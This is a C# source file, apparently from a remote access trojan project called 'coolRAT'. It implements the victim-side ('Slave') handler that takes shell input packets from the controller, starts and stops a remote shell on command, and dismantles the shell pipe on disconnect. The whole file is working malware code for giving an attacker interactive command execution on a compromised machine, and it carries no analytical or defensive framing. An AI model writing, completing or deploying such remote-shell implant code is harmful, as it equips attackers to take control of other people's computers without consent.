using coolRAT.Libs;
using coolRAT.Libs.PacketHandlers;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace coolRAT.Slave
{
    public class Shell_PacketHandler : PacketHandler
    {
        public Shell ShellInstance;
        public Client Client;

        public Shell_PacketHandler(TcpConnection connection, Client client, Shell shellInstance) : base(connection)
        {
            Client = client;
            ShellInstance = shellInstance;
        }

        public override void HandlePacket(object sender, string packet_raw)
        {
            Packet packet = Packet.Deserialize(packet_raw);
            if(packet.Type == "Shell_IO_ChangedPacket")
            {
                Shell_IO_ChangedPacket shell_IO_changed = Shell_IO_ChangedPacket.Deserialize(packet_raw);
                if(shell_IO_changed.ChangeType == ChangeType.Input)
                {
                    ShellInstance.Write(shell_IO_changed.Change);
                }
            }
            if(packet.Type == "SetShellStatePacket")
            {
                SetShellStatePacket setShellState = SetShellStatePacket.Deserialize(packet_raw);
                if (setShellState.ShellUniqueId != ShellInstance.UniqueId)
                {
                    ShellStateSetPacket result_fail = new ShellStateSetPacket(setShellState.ClientUniqueId, setShellState.ShellUniqueId,
                    setShellState.ShellState, false);
                    Connection.SendPacket(result_fail);
                    return;
                }
                
                switch(setShellState.ShellState)
                {
                    case ShellState.Running:
                        ShellInstance.Start();
                        break;
                    case ShellState.Stopped:
                        ShellInstance.Stop();
                        break;
                }

                ShellStateSetPacket result_success = new ShellStateSetPacket(setShellState.ClientUniqueId, setShellState.ShellUniqueId,
                    setShellState.ShellState, true);
                Connection.SendPacket(result_success);
            }
            if(packet.Type == "DisconnectShellPacket")
            {
                DisconnectShellPacket disconnectShellPacket = DisconnectShellPacket.Deserialize(packet_raw);
                if(disconnectShellPacket.ClientUniqueId != Client.UniqueId)
                {
                    ShellDisconnectedPacket result_fail = new ShellDisconnectedPacket(Client.UniqueId, ShellInstance.UniqueId, false);
                    Connection.SendPacket(result_fail);
                    return;
                }
                if (disconnectShellPacket.ShellUniqueId != ShellInstance.UniqueId)
                {
                    ShellDisconnectedPacket result_fail = new ShellDisconnectedPacket(Client.UniqueId, ShellInstance.UniqueId, false);
                    Connection.SendPacket(result_fail);
                    return;
                }

                ShellInstance.Stop();
                ShellInstance.ShellOutputChanged -= SlaveGlobalData.ShellOutputChangedHandler;
                SlaveGlobalData.ShellOutputChangedHandler = null;
                SlaveGlobalData.ShellInstance = null;
                if(SlaveGlobalData.ShellListenerLoop != null)
                {
                    SlaveGlobalData.ShellListenerLoop.AbortLoop = true;
                    SlaveGlobalData.ShellListenerLoop = null;
                }
                DisconnectPipePacket disconnectPipePacket = new DisconnectPipePacket(Client.UniqueId, PipeType.Shell);
                Client.Pipes.MainPipe.SendPacket(disconnectPipePacket);

                ShellDisconnectedPacket result_success = new ShellDisconnectedPacket(Client.UniqueId, ShellInstance.UniqueId, true);
                Connection.SendPacket(result_success);
            }
        }
    }
}
